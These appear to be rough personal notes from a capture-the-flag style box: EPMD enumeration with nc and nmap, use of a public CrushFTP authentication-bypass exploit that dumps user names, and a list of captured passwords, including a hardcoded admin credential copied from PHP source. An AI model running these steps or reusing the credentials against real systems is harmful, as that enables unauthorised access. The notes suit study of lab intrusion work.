___


erlang port mapper daemon

*listing nodes on epmd*
`echo -n -e “\x00\x01\x6e” | nc -vn <IP> 4369`


*nmap enum script*
```
sudo nmap -sV -Pn -n -T4 -p 4369 --script epmd-info 10.10.11.86
```


*found an ftp subdomain*


-> there is an ssh_runner node running on epmd but I would need cookie to connect to it or create a new vm for RCE

-> .erlang.cookie or vm.args


crushFTP server on the subdomain



*race condition CVE dumped users*

[*] NEW SESSION: c2f=9LMj
[*] EXFILTRATED 5 USERS: ben, crushadmin, default, jenna, TempAccount
[*] VULNERABLE! RACE CONDITION POSSIBLE!


*CVE*
**[watchTowr-vs-CrushFTP-Authentication-Bypass-CVE-2025-54309](https://github.com/watchtowrlabs/watchTowr-vs-CrushFTP-Authentication-Bypass-CVE-2025-54309)**


*got another exploit got access to the portal*


*crushFTP version*
Version 11.3.0



CrushFTP Version 11.3.0_2

Last Server Restart: Tue Sep 09 22:04:04 GMT 2025

CrushFTP is up to date (Version 11.3.0_2)

[Change Log](https://www.crushftp.com/version11_build.html)



am i admin? looks like
*this one might create user with better perms*
https://www.exploit-db.com/exploits/52295




Username : crushadmin Password : qQKb9D


Username : ben
 Password : 7VQzMG



*what is this password*

04E2xAXYFfDsEYtu



hardcoded creds

        if ($adminCheck->fetchColumn() == 0) {
            $adminPassword = password_hash('Crush4dmin990', PASSWORD_DEFAULT);
            $adminInsert = $this->pdo->prepare("
                INSERT INTO users (username, password, is_admin, name) 
                VALUES (?, ?, 1, 'Administrator')



Crush4dmin990






















